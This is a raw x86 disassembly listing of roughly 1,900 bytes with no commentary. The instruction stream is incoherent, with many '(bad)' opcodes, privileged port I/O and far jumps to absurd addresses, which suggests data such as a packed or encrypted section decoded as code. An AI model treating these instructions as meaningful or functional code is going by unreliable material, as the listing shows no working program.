  4019cf:	cmp    ebp,DWORD PTR [esi+0x43ee8b4c]
  4019d5:	jae    0x401a2f
  4019d7:	xchg   ebx,eax
  4019d8:	mov    ds,WORD PTR [ebx+0x48b7ade3]
  4019de:	cmp    esp,DWORD PTR [ecx-0x205d3b58]
  4019e4:	repnz pop ds
  4019e6:	dec    eax
  4019e7:	push   eax
  4019e8:	ror    DWORD PTR [edx],cl
  4019ea:	mov    WORD PTR [ebx],gs
  4019ec:	inc    edi
  4019ed:	sub    ah,BYTE PTR ds:0xd1a6c852
  4019f3:	mov    ecx,DWORD PTR [edi-0x7f]
  4019f6:	(bad)  
  4019f7:	xchg   esp,eax
  4019f8:	out    dx,al
  4019f9:	xchg   esi,eax
  4019fa:	data16 test dl,ch
  4019fd:	cmp    al,bl
  4019ff:	int    0x3f
  401a01:	xchg   esp,eax
  401a02:	test   eax,0x6f75f708
  401a07:	dec    ebx
  401a08:	das    
  401a09:	xchg   ebp,eax
  401a0a:	enter  0x78af,0x58
  401a0e:	inc    eax
  401a0f:	xor    ecx,DWORD PTR [edi]
  401a11:	inc    eax
  401a12:	or     BYTE PTR [eax],al
  401a14:	add    BYTE PTR [edx-0x23de37ef],dl
  401a1a:	mov    ch,0xd4
  401a1c:	push   esp
  401a1d:	mov    ch,0x18
  401a1f:	pop    ebx
  401a20:	mov    eax,0x882828d9
  401a25:	sbb    al,0xef
  401a27:	test   ebp,ecx
  401a29:	and    eax,0xf06e37f1
  401a2e:	xchg   edx,eax
  401a2f:	inc    ebx
  401a30:	dec    esi
  401a31:	cmc    
  401a32:	(bad)  
  401a33:	push   0xe6a0f323
  401a38:	out    dx,eax
  401a39:	fs (bad) 
  401a3b:	xchg   esi,eax
  401a3c:	rcr    dh,cl
  401a3e:	or     eax,0x138e324
  401a43:	push   esi
  401a44:	int3   
  401a45:	mov    eax,ds:0xdf2303fd
  401a4a:	lods   eax,DWORD PTR ds:[esi]
  401a4b:	push   ecx
  401a4c:	mov    ch,0xf2
  401a4e:	sahf   
  401a4f:	int3   
  401a50:	xchg   ecx,eax
  401a51:	xor    al,0x8c
  401a53:	outs   dx,BYTE PTR ds:[esi]
  401a54:	leave  
  401a55:	cdq    
  401a56:	mov    ecx,0x20ea8684
  401a5b:	test   al,0x19
  401a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a5e:	cmp    eax,0x376f9fac
  401a63:	js     0x401ab8
  401a65:	pop    ds
  401a66:	inc    edi
  401a67:	ret    0xc997
  401a6a:	shl    DWORD PTR [ebp+0x19f16d68],0x2f
  401a71:	clc    
  401a72:	ror    BYTE PTR [edi-0x797c1c9c],cl
  401a78:	in     eax,0x4d
  401a7a:	mov    edx,0xfedd8db
  401a7f:	mov    bh,0x8a
  401a81:	xchg   edi,eax
  401a82:	mov    dl,0xd7
  401a84:	rcl    DWORD PTR [eax+0x13],0x2d
  401a88:	fnstcw WORD PTR [eax]
  401a8a:	ror    DWORD PTR ds:0x73b57174,0x87
  401a91:	hlt    
  401a92:	sub    DWORD PTR [ecx+0x71],ecx
  401a95:	jae    0x401b00
  401a97:	fdivr  DWORD PTR [ecx+0x21b1515f]
  401a9d:	sbb    ecx,DWORD PTR [ecx+0x9]
  401aa0:	mov    ds,WORD PTR [eax]
  401aa2:	shr    DWORD PTR [edi+0x5548cb94],cl
  401aa8:	je     0x401ad3
  401aaa:	(bad)  
  401aab:	popa   
  401aac:	dec    ebp
  401aad:	mov    cl,0x8c
  401aaf:	aaa    
  401ab0:	pop    ecx
  401ab1:	test   DWORD PTR [edi],ecx
  401ab3:	lds    ebx,FWORD PTR [edx]
  401ab5:	hlt    
  401ab6:	ins    DWORD PTR es:[edi],dx
  401ab7:	fist   DWORD PTR [edx+0x2ce3dde0]
  401abd:	repz popa 
  401abf:	mov    BYTE PTR [esi+0xf],dh
  401ac2:	test   DWORD PTR [ecx-0x78],ebx
  401ac5:	and    DWORD PTR [eax+0x2b],0xffffffcc
  401ac9:	pop    ebp
  401aca:	pusha  
  401acb:	stos   DWORD PTR es:[edi],eax
  401acc:	mov    al,ds:0x31005522
  401ad1:	xchg   esi,eax
  401ad2:	repnz sar edi,0xba
  401ad6:	lea    eax,[ebx]
  401ad8:	std    
  401ad9:	adc    DWORD PTR [edi-0x41],ebp
  401adc:	(bad)  
  401add:	(bad)  
  401ade:	and    eax,DWORD PTR [ebp+0x70]
  401ae1:	mov    ds:0x85428320,al
  401ae6:	jne    0x401a9b
  401ae8:	and    eax,0x3f8d4b69
  401aed:	inc    ebx
  401aee:	xchg   BYTE PTR [ebp-0x3c6e970a],cl
  401af4:	sti    
  401af5:	inc    eax
  401af6:	out    dx,eax
  401af7:	xor    esi,esi
  401af9:	jmp    DWORD PTR [ebp-0x12db695c]
  401aff:	js     0x401adf
  401b01:	popf   
  401b02:	mov    al,0x5f
  401b04:	arpl   WORD PTR [ebp+ebx*4+0x2c],dx
  401b08:	cli    
  401b09:	mov    ds:0x539102b1,al
  401b0e:	sti    
  401b0f:	imul   DWORD PTR ds:[ecx-0x18]
  401b13:	dec    esp
  401b14:	(bad)  
  401b15:	pop    ds
  401b16:	loopne 0x401b09
  401b18:	sub    BYTE PTR [esi],bl
  401b1a:	jge    0x401b68
  401b1c:	pop    esi
  401b1d:	retf   0xad66
  401b20:	test   BYTE PTR [ebx-0x7fc22e85],al
  401b26:	xor    esi,edi
  401b28:	fucomi st,st(1)
  401b2a:	cmp    esp,DWORD PTR [ebx-0x677255ed]
  401b30:	scas   eax,DWORD PTR es:[edi]
  401b31:	in     eax,0x6
  401b33:	mov    ds:0x3fab34f1,al
  401b38:	sbb    eax,0x98d6be91
  401b3d:	xchg   ecx,eax
  401b3e:	bound  edi,QWORD PTR [ecx]
  401b40:	pop    ds
  401b41:	nop
  401b42:	xor    DWORD PTR [ecx-0x24],eax
  401b45:	xchg   esi,eax
  401b46:	outs   dx,DWORD PTR ds:[esi]
  401b47:	inc    edx
  401b48:	pop    eax
  401b49:	nop
  401b4a:	icebp  
  401b4b:	pusha  
  401b4c:	push   0xffffffb5
  401b4e:	add    edx,DWORD PTR [edi]
  401b50:	or     al,0x4d
  401b52:	daa    
  401b53:	sar    DWORD PTR [ebp-0x612981da],0x90
  401b5a:	add    al,0x35
  401b5c:	push   cs
  401b5d:	inc    eax
  401b5e:	inc    ebp
  401b5f:	fdiv   DWORD PTR [edi+ebx*4]
  401b62:	lea    edi,[ecx-0x17]
  401b65:	icebp  
  401b66:	or     DWORD PTR [edi],ebp
  401b68:	jp     0x401aec
  401b6a:	xor    ah,BYTE PTR [esi+ecx*2+0x22]
  401b6e:	adc    DWORD PTR [edx+0x4e],esp
  401b71:	cpuid  
  401b73:	dec    ecx
  401b74:	or     dh,BYTE PTR [ebp-0x7a]
  401b77:	fsubp  st(4),st
  401b79:	xchg   ebp,eax
  401b7a:	and    ah,BYTE PTR [eax]
  401b7c:	jnp    0x401b90
  401b7e:	cmp    dh,bh
  401b80:	sti    
  401b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b82:	mov    ah,0x24
  401b84:	in     eax,0xd6
  401b86:	les    edx,FWORD PTR [ecx]
  401b88:	ins    DWORD PTR es:[edi],dx
  401b89:	sub    DWORD PTR [edi],ebp
  401b8b:	sti    
  401b8c:	aad    0x47
  401b8e:	pop    eax
  401b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b90:	repz mov al,0x52
  401b93:	fild   DWORD PTR [edx+0x28acd858]
  401b99:	cwde   
  401b9a:	ror    BYTE PTR [ecx+0x1f],cl
  401b9d:	shl    dh,0x71
  401ba0:	sub    esi,DWORD PTR [edi]
  401ba2:	and    ecx,DWORD PTR [ebx+0x6c967277]
  401ba8:	inc    edi
  401ba9:	div    DWORD PTR [eax-0x53a59d77]
  401baf:	(bad)  
  401bb0:	dec    esp
  401bb1:	xor    BYTE PTR [edi+0x7205acd7],al
  401bb7:	mov    dl,0x96
  401bb9:	test   DWORD PTR [edx],eax
  401bbb:	popf   
  401bbc:	adc    DWORD PTR [ecx+eiz*2-0x1b],0xffffffba
  401bc1:	fcom   QWORD PTR fs:[ecx]
  401bc4:	cmp    esi,esi
  401bc6:	cmp    WORD PTR [ebx+0x5a8e61f7],cx
  401bcd:	pushf  
  401bce:	mov    WORD PTR [ebp-0x649fb181],cs
  401bd4:	in     eax,0x8c
  401bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bd7:	ret    
  401bd8:	in     eax,dx
  401bd9:	xor    al,0xb2
  401bdb:	xor    al,0x32
  401bdd:	pusha  
  401bde:	pop    edx
  401bdf:	ins    BYTE PTR es:[edi],dx
  401be0:	mov    ebp,0xe0ae5107
  401be5:	adc    esp,0xffffff8d
  401be8:	xor    DWORD PTR [ecx+0xeb5e420],0xffffff9b
  401bef:	loopne 0x401c4b
  401bf1:	lahf   
  401bf2:	and    BYTE PTR [ecx],dl
  401bf4:	fcomp  QWORD PTR [ebx+0x66]
  401bf7:	popf   
  401bf8:	clc    
  401bf9:	cmp    al,0x43
  401bfb:	addr16 clc 
  401bfd:	test   al,0x55
  401bff:	in     al,dx
  401c00:	pop    es
  401c01:	js     0x401b9d
  401c03:	sbb    al,BYTE PTR [ecx]
  401c05:	sar    al,1
  401c07:	fdiv   QWORD PTR [ecx-0x62]
  401c0a:	outs   dx,DWORD PTR ds:[esi]
  401c0b:	xor    BYTE PTR [eax+0x275b9340],bl
  401c11:	xor    ch,BYTE PTR [edi+edi*4+0xd527b23]
  401c18:	mov    al,bh
  401c1a:	jno    0x401be7
  401c1c:	mov    ebp,0xb8fda4f6
  401c21:	pop    esp
  401c22:	cld    
  401c23:	xchg   esi,eax
  401c24:	mov    al,ah
  401c26:	xor    eax,0x23b76ec9
  401c2b:	cwde   
  401c2c:	imul   edx,DWORD PTR [edi+0x759165cb],0xfffffff4
  401c33:	mov    edi,esi
  401c35:	mov    dl,0x1a
  401c37:	out    dx,al
  401c38:	jno    0x401c9c
  401c3a:	mov    BYTE PTR [edi],al
  401c3c:	mov    bh,0xa5
  401c3e:	pop    edx
  401c3f:	mov    ecx,0x33a64322
  401c44:	icebp  
  401c45:	jmp    0x17153564
  401c4a:	iret   
  401c4b:	push   es
  401c4c:	sub    al,0x98
  401c4e:	fwait
  401c4f:	stc    
  401c50:	stos   BYTE PTR es:[edi],al
  401c51:	dec    edx
  401c52:	bound  edx,QWORD PTR [esi-0x35]
  401c55:	mov    cl,0x68
  401c57:	dec    edx
  401c58:	jecxz  0x401bfa
  401c5a:	cmp    BYTE PTR [esp+ebx*4-0x6d],ah
  401c5e:	xor    DWORD PTR [eax],edi
  401c60:	xchg   esp,eax
  401c61:	(bad)  
  401c62:	fmul   QWORD PTR [edx*1-0x18372cb9]
  401c69:	lahf   
  401c6a:	xlat   BYTE PTR ds:[ebx]
  401c6b:	js     0x401c27
  401c6d:	add    eax,0xcec01b3d
  401c72:	push   esi
  401c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c74:	xchg   ecx,eax
  401c75:	add    al,0x67
  401c77:	lock mov ch,0xb6
  401c7a:	mov    ebx,0x64e5efb4
  401c7f:	jg     0x401c41
  401c81:	pop    es
  401c82:	inc    ecx
  401c83:	push   cs
  401c84:	leave  
  401c85:	inc    esp
  401c86:	es retf 0x8398
  401c8a:	xchg   BYTE PTR [ebx+0x77],dh
  401c8d:	(bad)  
  401c8e:	pop    edx
  401c8f:	pusha  
  401c90:	cmc    
  401c91:	push   cs
  401c92:	inc    ecx
  401c93:	push   cs
  401c94:	cdq    
  401c95:	mov    ds:0x8aa33b2a,eax
  401c9a:	inc    eax
  401c9b:	jmp    0x73eb:0x514175e7
  401ca2:	push   esi
  401ca3:	xor    eax,0xb4561293
  401ca8:	inc    edi
  401ca9:	sbb    DWORD PTR [ebx],0xac081684
  401caf:	adc    DWORD PTR [ecx],edi
  401cb1:	adc    DWORD PTR [edi],ebp
  401cb3:	add    eax,0xfe10c660
  401cb8:	xor    ch,bl
  401cba:	dec    eax
  401cbb:	adc    BYTE PTR [edx+0x51],dh
  401cbe:	adc    BYTE PTR [esi+0x589c9ff4],0x8e
  401cc5:	aam    0xef
  401cc7:	or     al,0x4b
  401cc9:	add    DWORD PTR [ecx-0x42],edx
  401ccc:	adc    al,ch
  401cce:	fisub  DWORD PTR [ebp+0x2b]
  401cd1:	out    0x49,eax
  401cd3:	mov    ebx,DWORD PTR [edi+0x2bb997f4]
  401cd9:	gs or  bh,cl
  401cdc:	test   esp,esp
  401cde:	mov    ch,0xad
  401ce0:	stos   DWORD PTR es:[edi],eax
  401ce1:	dec    ebp
  401ce2:	xchg   esi,eax
  401ce3:	and    al,0x79
  401ce5:	cmp    BYTE PTR [edx-0x18ef36c9],ch
  401ceb:	fstp   TBYTE PTR [eax+0x22]
  401cee:	lahf   
  401cef:	mov    esi,0x127298eb
  401cf4:	pop    esi
  401cf5:	xchg   edi,eax
  401cf6:	jb     0x401d2f
  401cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cf9:	sbb    al,0x3
  401cfb:	popa   
  401cfc:	sahf   
  401cfd:	mov    ebx,0x6768358e
  401d02:	sub    DWORD PTR [ebx],0x7965542
  401d08:	(bad)  
  401d09:	mov    ebp,0xf0e94c98
  401d0e:	sti    
  401d0f:	mov    ebx,0xef00051c
  401d14:	popa   
  401d15:	mov    cs,WORD PTR [edi+0xa0fddaf]
  401d1b:	sahf   
  401d1c:	xchg   edi,eax
  401d1d:	pop    esi
  401d1e:	inc    esp
  401d1f:	sbb    eax,0xd2dc1f97
  401d24:	jne    0x401d7f
  401d26:	outs   dx,BYTE PTR ds:[esi]
  401d27:	xor    ecx,eax
  401d29:	mov    dh,0x9d
  401d2b:	xor    DWORD PTR [esp+ecx*1-0x1f],edi
  401d2f:	jo     0x401d06
  401d31:	inc    ecx
  401d32:	aas    
  401d33:	mov    ch,BYTE PTR [edi]
  401d35:	jbe    0x401d88
  401d37:	push   cs
  401d38:	std    
  401d39:	mov    ebx,0x2466b22f
  401d3e:	jo     0x401d3d
  401d40:	xchg   esi,eax
  401d41:	aaa    
  401d42:	repz mov WORD PTR [esi+esi*2],cs
  401d46:	test   al,ch
  401d48:	rol    DWORD PTR [esi],0x5a
  401d4b:	aas    
  401d4c:	jmp    0x7a502fb
  401d51:	arpl   WORD PTR [edi-0x9d59d12],ax
  401d57:	pusha  
  401d58:	push   edi
  401d59:	neg    DWORD PTR [ebx+0x73]
  401d5c:	ror    al,cl
  401d5e:	dec    ecx
  401d5f:	fwait
  401d60:	cmp    BYTE PTR [edx],0x81
  401d63:	sbb    dl,BYTE PTR [esi]
  401d65:	sbb    eax,0xc697b18c
  401d6a:	outs   dx,DWORD PTR ds:[esi]
  401d6b:	es popf 
  401d6d:	sbb    cl,BYTE PTR [edx+eiz*2+0x4ed554e1]
  401d74:	pop    edx
  401d75:	jo     0x401db3
  401d77:	leave  
  401d78:	in     al,0xaf
  401d7a:	call   0xef56:0xb95a14b
  401d81:	stos   DWORD PTR es:[edi],eax
  401d82:	pop    eax
  401d83:	mov    al,0x7a
  401d85:	enter  0xee8a,0xf9
  401d89:	xor    DWORD PTR [edi-0x35],ebp
  401d8c:	inc    ecx
  401d8d:	pop    ss
  401d8e:	cs push esi
  401d90:	pop    ecx
  401d91:	in     al,0xd0
  401d93:	dec    DWORD PTR [esi-0xa]
  401d96:	mov    ebx,0xe19928f
  401d9b:	push   ebp
  401d9c:	pusha  
  401d9d:	inc    esi
  401d9e:	jl     0x401da7
  401da0:	(bad)  
  401da1:	adc    esi,DWORD PTR [ebx]
  401da3:	mov    ebx,0xda186a73
  401da8:	gs out 0xff,eax
  401dab:	sub    BYTE PTR [ecx-0x66c0a492],ch
  401db1:	int3   
  401db2:	stc    
  401db3:	or     al,0x13
  401db5:	shr    BYTE PTR [eax+0x8665f5b],1
  401dbb:	pop    edx
  401dbc:	push   edx
  401dbd:	stos   BYTE PTR es:[edi],al
  401dbe:	loopne 0x401d78
  401dc0:	jge    0x401d5f
  401dc2:	retf   0xfd91
  401dc5:	sbb    BYTE PTR [ecx+0x5dfc2a78],0xcc
  401dcc:	ds dec esp
  401dce:	adc    al,al
  401dd0:	adc    al,BYTE PTR [ebp+0xbbcfef3]
  401dd6:	mov    ds:0x6c90acb8,al
  401ddb:	mov    ds:0xe22e51e6,eax
  401de0:	out    dx,al
  401de1:	rol    DWORD PTR [edx],0xbb
  401de4:	mov    ah,0xc1
  401de6:	xchg   esp,eax
  401de7:	pushf  
  401de8:	mov    edi,0x70106094
  401ded:	stos   BYTE PTR es:[edi],al
  401dee:	push   ss
  401def:	scas   al,BYTE PTR es:[edi]
  401df0:	mov    eax,0xaf3c2a55
  401df5:	pop    ebx
  401df6:	dec    ebx
  401df7:	pop    edi
  401df8:	int3   
  401df9:	xor    al,0xef
  401dfb:	xor    eax,0x540d272a
  401e00:	xchg   ebp,eax
  401e01:	push   ds
  401e02:	inc    edx
  401e03:	test   DWORD PTR [edi],ebx
  401e05:	mov    ecx,0x727ceca0
  401e0a:	int3   
  401e0b:	fild   QWORD PTR [ebp-0x9]
  401e0e:	mov    ebp,0xd761ee51
  401e13:	(bad)  
  401e14:	arpl   WORD PTR [ecx-0x13],bx
  401e17:	or     eax,0x3c5e301d
  401e1c:	(bad)  
  401e1d:	fld    DWORD PTR [edi-0x79b3cdc2]
  401e23:	push   0xd0510b99
  401e28:	adc    bl,ah
  401e2a:	mov    bl,0x9b
  401e2c:	mov    eax,ds:0xde3b5a6f
  401e31:	jne    0x401eb2
  401e33:	mov    ebx,0x94e08503
  401e38:	fwait
  401e39:	aam    0x71
  401e3b:	jmp    0xf0acdce7
  401e40:	mov    al,ds:0x7fbc26ca
  401e45:	pusha  
  401e46:	std    
  401e47:	outs   dx,BYTE PTR ds:[esi]
  401e48:	bound  eax,QWORD PTR [edx-0x4bb754cd]
  401e4e:	ror    bl,0xf6
  401e51:	cmp    DWORD PTR [edx-0xd],eax
  401e54:	(bad)  
  401e55:	int3   
  401e56:	inc    esp
  401e57:	fisttp QWORD PTR [edx]
  401e59:	jb     0x401e3a
  401e5b:	lea    ebx,ss:[edi]
  401e5e:	or     al,0xac
  401e60:	nop
  401e61:	push   es
  401e62:	pop    eax
  401e63:	cmp    BYTE PTR [edi-0x76],dl
  401e66:	scas   eax,DWORD PTR es:[edi]
  401e67:	(bad)  
  401e68:	inc    eax
  401e69:	inc    ebx
  401e6a:	(bad)  [ecx+0x29]
  401e6d:	mov    gs,WORD PTR [ebp-0x41]
  401e70:	aaa    
  401e71:	jmp    DWORD PTR [eax]
  401e73:	dec    ebp
  401e74:	jl     0x401e4d
  401e76:	int3   
  401e77:	xchg   ebx,eax
  401e78:	out    dx,al
  401e79:	int3   
  401e7a:	lods   al,BYTE PTR ds:[esi]
  401e7b:	nop
  401e7c:	xchg   ecx,eax
  401e7d:	mov    eax,ds:0xbca9751d
  401e82:	clc    
  401e83:	sub    DWORD PTR [ebx-0x1c6e9d9c],esi
  401e89:	jge    0x401e34
  401e8b:	ja     0x401e58
  401e8d:	inc    eax
  401e8e:	in     al,0xe0
  401e90:	dec    ecx
  401e91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e92:	or     DWORD PTR ds:0xc8396616,0x66
  401e99:	retf   
  401e9a:	or     dh,BYTE PTR [edx+0x76]
  401e9d:	pop    es
  401e9e:	xchg   ch,bl
  401ea0:	and    eax,0xee4c7ce4
  401ea5:	adc    eax,0xf3943c90
  401eaa:	les    edi,FWORD PTR [edx+0x46]
  401ead:	call   0x93c3057b
  401eb2:	add    BYTE PTR [edx-0x75],dh
  401eb5:	xchg   esp,eax
  401eb6:	mov    bl,0xad
  401eb8:	or     dh,BYTE PTR [edx+0x6a]
  401ebb:	loop   0x401e54
  401ebd:	xlat   BYTE PTR ds:[ebx]
  401ebe:	jge    0x401eb7
  401ec0:	in     al,dx
  401ec1:	push   esp
  401ec2:	xor    esi,DWORD PTR [ebx]
  401ec4:	cmp    DWORD PTR [ebp-0x17],eax
  401ec7:	cmc    
  401ec8:	pop    ecx
  401ec9:	add    edi,ebp
  401ecb:	add    DWORD PTR [ecx],ecx
  401ecd:	shr    DWORD PTR [ecx-0x71],0x9f
  401ed1:	adc    eax,0x90b5e9c
  401ed6:	sub    eax,0xc3002781
  401edb:	inc    edi
  401edc:	sbb    esp,eax
  401ede:	jp     0x401ea2
  401ee0:	mov    al,0xc1
  401ee2:	cld    
  401ee3:	jnp    0x401f1a
  401ee5:	mov    cl,0x83
  401ee7:	dec    ecx
  401ee8:	push   edi
  401ee9:	ds lock inc esi
  401eec:	push   es
  401eed:	leave  
  401eee:	or     ah,dl
  401ef0:	pushf  
  401ef1:	add    DWORD PTR [ecx],edx
  401ef3:	xor    BYTE PTR ds:0xb64270c5,ah
  401ef9:	mov    WORD PTR [edx+ebp*8-0xb0f3d64],?
  401f00:	pop    ebx
  401f01:	int    0x6c
  401f03:	mov    ebx,0xd01681a6
  401f08:	mov    ebp,0xc205e70e
  401f0d:	lds    edx,FWORD PTR [ecx+0x75]
  401f10:	pop    esp
  401f11:	mov    ebp,0xad7a5b27
  401f16:	mov    ds:0xbba00ec1,eax
  401f1b:	cmp    al,BYTE PTR [eax+0x4c1c1138]
  401f21:	loopne 0x401eb1
  401f23:	ret    0xf8ab
  401f26:	dec    ebx
  401f27:	je     0x401ed7
  401f29:	or     eax,edi
  401f2b:	mov    edi,0xecafe4cc
  401f30:	test   edi,esp
  401f32:	and    BYTE PTR [esi],bl
  401f34:	and    BYTE PTR [edx-0x36558654],0xd7
  401f3b:	cmp    DWORD PTR [edx-0x49],ebp
  401f3e:	mov    WORD PTR [esi-0x3a],ds
  401f41:	pop    ecx
  401f42:	nop
  401f43:	jp     0x401f85
  401f45:	mov    WORD PTR [esi+0x55],?
  401f48:	es xchg esi,eax
  401f4a:	lea    ecx,[ebx]
  401f4c:	inc    ebx
  401f4d:	inc    ecx
  401f4e:	push   ecx
  401f4f:	cmp    BYTE PTR [edx],bh
  401f51:	lods   al,BYTE PTR ds:[esi]
  401f52:	mov    al,ds:0x43386c82
  401f57:	call   0x5409:0x8faf6a8b
  401f5e:	and    eax,DWORD PTR [ecx-0x56]
  401f61:	ret    0x2704
  401f64:	scas   al,BYTE PTR es:[edi]
  401f65:	xchg   DWORD PTR [edx+0x2e],ecx
  401f68:	mov    ss,WORD PTR ds:0x46a20e8d
  401f6e:	ins    DWORD PTR es:[edi],dx
  401f6f:	mov    DWORD PTR [ecx+ecx*8-0x3f],ebp
  401f73:	iret   
  401f74:	ficom  DWORD PTR [ebp+0x42ab2bbe]
  401f7a:	(bad)  
  401f7b:	repz fadd DWORD PTR [esi+0x12]
  401f7f:	sub    BYTE PTR ss:[edx],cl
  401f82:	popf   
  401f83:	push   0x20
  401f85:	xchg   BYTE PTR [esi+0x3b11025f],al
  401f8b:	dec    esi
  401f8c:	mov    ah,0x16
  401f8e:	sub    ch,BYTE PTR [ecx-0x1c]
  401f91:	inc    edx
  401f92:	sub    DWORD PTR [eax+0x7ebb6225],esi
  401f98:	inc    ecx
  401f99:	in     eax,dx
  401f9a:	dec    esp
  401f9b:	fdiv   QWORD PTR ss:[ecx+ecx*2+0x1ecde3b0]
  401fa3:	test   BYTE PTR [eax+eax*8+0x15a5a320],ah
  401faa:	dec    ebx
  401fab:	mov    esi,0x4dff8a21
  401fb0:	mov    al,ds:0x6f98a5b4
  401fb5:	shl    DWORD PTR [esi-0x2743db3b],1
  401fbb:	popf   
  401fbc:	popf   
  401fbd:	sub    al,0xc2
  401fbf:	rol    BYTE PTR [esi-0x6c],cl
  401fc2:	cld    
  401fc3:	outs   dx,BYTE PTR cs:[esi]
  401fc5:	(bad)  
  401fc6:	es loope 0x401ff3
  401fc9:	dec    eax
  401fca:	fist   WORD PTR [ebx]
  401fcc:	mov    eax,ds:0xe6ed2ce8
  401fd1:	push   0x52
  401fd3:	fwait
  401fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fd5:	xor    BYTE PTR [ecx],0xe
  401fd8:	mov    ds:0xe41dae79,eax
  401fdd:	sar    BYTE PTR [ebp-0x741fcffe],cl
  401fe3:	mov    al,0xbd
  401fe5:	fstp   QWORD PTR [ebx-0x54afb9ce]
  401feb:	popf   
  401fec:	imul   esi,DWORD PTR [edx],0x13
  401fef:	ror    BYTE PTR [ebx+0x50c9a012],1
  401ff5:	dec    ecx
  401ff6:	dec    ecx
  401ff7:	aam    0x69
  401ff9:	div    cl
  401ffb:	fcomp  st(2)
  401ffd:	retf   0x8e5b
  402000:	push   ebp
  402001:	or     BYTE PTR ds:0xc00e9bb3,dh
  402007:	mov    dl,0x99
  402009:	mov    ds:0xbe259410,eax
  40200e:	dec    esp
  40200f:	mov    eax,0x30ccfb38
  402014:	into   
  402015:	lods   al,BYTE PTR ds:[esi]
  402016:	add    bh,BYTE PTR [esi]
  402018:	pop    edx
  402019:	ret    
  40201a:	das    
  40201b:	and    esi,0xea563299
  402021:	retf   
  402022:	pop    eax
  402023:	inc    ecx
  402024:	xchg   DWORD PTR [esi],edi
  402026:	ja     0x401fac
  402028:	mov    ebx,0x2f623009
  40202d:	lods   al,BYTE PTR ds:[esi]
  40202e:	into   
  40202f:	or     edi,DWORD PTR [ebx]
  402031:	push   0x4c
  402033:	pop    ds
  402034:	xor    edx,edi
  402036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402037:	push   ebp
  402038:	mov    bh,0xf4
  40203a:	cmp    eax,0x53f6ce0b
  40203f:	loope  0x401fef
  402041:	(bad)  
  402043:	iret   
  402044:	cdq    
  402045:	stc    
  402046:	cwde   
  402047:	test   BYTE PTR [ebp+ebp*2+0x1e],ah
  40204b:	mov    BYTE PTR [ebx+edx*4+0x16fee14],bh
  402052:	sub    eax,0x93426330
  402057:	adc    esi,DWORD PTR [ecx]
  402059:	(bad)  [esi]
  40205b:	dec    ebx
  40205c:	pop    eax
  40205d:	push   ds
  40205e:	(bad)  
  40205f:	pop    ebx
  402060:	cdq    
  402061:	mov    ah,0x56
  402063:	popf   
  402064:	js     0x40208c
  402066:	add    dl,0x11
  402069:	inc    ecx
  40206a:	mov    al,0x7d
  40206c:	test   ecx,esi
  40206e:	aas    
  40206f:	scas   al,BYTE PTR es:[edi]
  402070:	mov    ss,WORD PTR [eax-0x26b50f18]
  402076:	fwait
  402077:	and    cl,BYTE PTR [ebx-0x32]
  40207a:	jmp    0x402069
  40207c:	sub    dl,BYTE PTR [edi+eiz*1-0x973bd87]
  402083:	scas   al,BYTE PTR es:[edi]
  402084:	lock (bad) 
  402086:	pop    ebx
  402087:	sub    DWORD PTR [edi+0x7d],esp
  40208a:	nop
  40208b:	add    bh,0xd4
  40208e:	fstp   TBYTE PTR [ebp-0x42]
  402091:	xchg   ecx,eax
  402092:	loope  0x40206f
  402094:	enter  0x6ffb,0x50
  402098:	xor    cl,BYTE PTR [edi-0x5c]
  40209b:	xor    eax,0x31007ab4
  4020a0:	outs   dx,BYTE PTR ds:[esi]
  4020a1:	xor    ecx,0xffffffe3
  4020a4:	add    BYTE PTR [esi],0x78
  4020a7:	fimul  WORD PTR [edx-0x26]
  4020aa:	sbb    ah,BYTE PTR [ecx+0x25999df5]
  4020b0:	leave  
  4020b1:	fdivp  st(6),st
  4020b3:	or     BYTE PTR [edi+ecx*1-0x5e],dl
  4020b7:	outs   dx,DWORD PTR ds:[esi]
  4020b8:	or     DWORD PTR [edx-0x1fa74229],0xffffffe7
  4020bf:	cmp    DWORD PTR [edi+esi*4],ebx
  4020c2:	pop    ebx
  4020c3:	mov    bl,0xec
  4020c5:	mov    bl,cl
  4020c7:	dec    ebx
  4020c8:	jl     0x40207b
  4020ca:	and    DWORD PTR ds:0xb9db56d4,esi
  4020d0:	lahf   
  4020d1:	lds    ecx,FWORD PTR [esi+edi*4+0x78]
  4020d5:	or     al,0x70
  4020d7:	std    
  4020d8:	sahf   
  4020d9:	jp     0x4020e4
  4020db:	pop    ss
  4020dc:	xchg   ebp,eax
  4020dd:	imul   esp,DWORD PTR [esi+0x14ebe35f],0xffffff94
  4020e4:	mov    bh,0x91
  4020e6:	aaa    
  4020e7:	xchg   esi,eax
  4020e8:	js     0x40215f
  4020ea:	xchg   ebp,eax
  4020eb:	in     al,dx
  4020ec:	xchg   ebp,eax
  4020ed:	aas    
  4020ee:	xor    edx,DWORD PTR [edi-0x67]
  4020f1:	aad    0xd6
  4020f3:	sbb    BYTE PTR [ecx],ah
  4020f5:	pop    esp
  4020f6:	stos   BYTE PTR es:[edi],al
  4020f7:	pop    esi
  4020f8:	or     bh,BYTE PTR [esi-0x56]
  4020fb:	stos   DWORD PTR es:[edi],eax
  4020fc:	jbe    0x4020b3
  4020fe:	fimul  WORD PTR [ebp+0x29]
  402101:	sbb    edi,DWORD PTR [ecx]
  402103:	ficomp DWORD PTR [ebx*2+0x379ffdae]
  40210a:	and    DWORD PTR cs:[ecx+0x2e],0xffffffc4
  40210f:	pop    esi
  402110:	dec    ebx
  402111:	js     0x402135
  402113:	lock ss cmp al,0xc8
  402117:	inc    ebx
  402118:	sbb    al,0x7c
  40211a:	pop    ebx
  40211b:	ja     0x4020d1
  40211d:	jnp    0x402141
  40211f:	mov    dh,0x46
  402121:	adc    ebp,esp
  402123:	cmp    esp,ebx
  402125:	icebp  
  402126:	stos   DWORD PTR es:[edi],eax
  402127:	(bad)
  40212a:	outs   dx,BYTE PTR ds:[esi]
  40212b:	arpl   WORD PTR [ebp-0x1be9e98d],ax
  402131:	jp     0x4021ae
  402133:	stos   BYTE PTR es:[edi],al
  402134:	loope  0x4021ad
  402136:	cwde   
  402137:	test   DWORD PTR [esi],ebx
